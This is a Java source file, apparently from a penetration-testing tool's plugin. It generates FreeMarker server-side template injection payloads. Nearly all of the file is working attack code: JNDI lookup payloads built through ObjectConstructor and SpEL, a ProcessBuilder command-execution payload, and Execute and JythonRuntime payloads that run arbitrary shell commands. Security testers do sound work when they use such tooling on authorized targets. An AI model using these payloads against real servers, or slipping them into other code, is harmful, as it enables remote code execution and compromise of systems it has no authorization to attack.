package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;
import me.gv7.woodpecker.plugin.utils.ArgumentTokenizer;
import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;
import me.gv7.woodpecker.plugin.utils.Utils;

import static me.gv7.woodpecker.plugin.utils.Utils.escape;

public class FreeMarkerExpr implements IExpr {
    private String _encoder = "none";

    @Override
    public void setEncoder(String encoder) {
        _encoder = encoder;
    }

    private String out(String text) {
        return Utils.encoder(text, _encoder);
    }

    @Override
    public String getName() {
        return "FreeMarker";
    }

    @Override
    public String[] genDnslog(String domain) {
        return null;
    }

    @Override
    public String[] genHttplog(String url) {
        return null;
    }

    @Override
    public String[] genSleep(int sec) {
        return null;
    }

    @Override
    public String[] genMemShell(byte[] memShellClass) {
        return null;
    }

    @Override
    public String[] genJNDI(String jndiAddress) {
        return new String[]{
                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.naming.InitialContext\").lookup(\"" + jndiAddress + "\")}"),
                out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"new javax.naming.InitialContext().lookup('" + jndiAddress + "')\").getValue()}")
        };
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                out("<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\"," + ArgumentTokenizer.getTokenizedString(command, "\"") + ").start()}")
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                out("<#assign vx=\"freemarker.template.utility.Execute\"?new()> ${ vx(\"" + escape(command, "\"") + "\") }"),
                out("${\"freemarker.template.utility.Execute\"?new()(\"" + escape(command, "\"") + "\")}"),
                out("<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"" + escape(command, "\"") + "\")</@value>")
        };
    }

}
